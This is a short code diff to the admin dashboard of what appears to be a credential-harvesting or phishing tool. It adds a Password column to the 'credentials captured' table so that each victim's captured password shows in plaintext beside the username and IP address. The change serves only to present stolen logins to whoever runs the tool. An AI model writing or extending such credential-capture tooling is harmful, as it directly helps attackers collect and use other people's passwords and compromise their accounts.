@@ -294,6 +294,7 @@
               <tr>
                 <th>#</th>
                 <th>Username / Email</th>
+                <th>Password</th>
                 <th>IP Address</th>
                 <th>Date</th>
                 <th>Time</th>
@@ -782,7 +783,7 @@ function refreshCredsPanel() {
   updateStat('stat-creds', credLogs.length);
 
   if (credLogs.length === 0) {
-    tbody.innerHTML = `<tr><td colspan="5"><div class="empty-state"><div class="icon">🔑</div><p>No credentials captured yet</p></div></td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="6"><div class="empty-state"><div class="icon">🔑</div><p>No credentials captured yet</p></div></td></tr>`;
     return;
   }
 
@@ -790,6 +791,7 @@ function refreshCredsPanel() {
     <tr>
       <td style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">#${l.id}</td>
       <td style="font-weight:600">${escapeHtml(l.username)}</td>
+      <td style="font-family:var(--font-mono);font-weight:600;color:#e05c5c">${escapeHtml(l.password || 'N/A')}</td>
       <td class="ip-text">${l.ip}</td>
       <td style="font-size:11px;color:var(--text-muted)">${l.date}</td>
       <td style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">${l.time}</td>
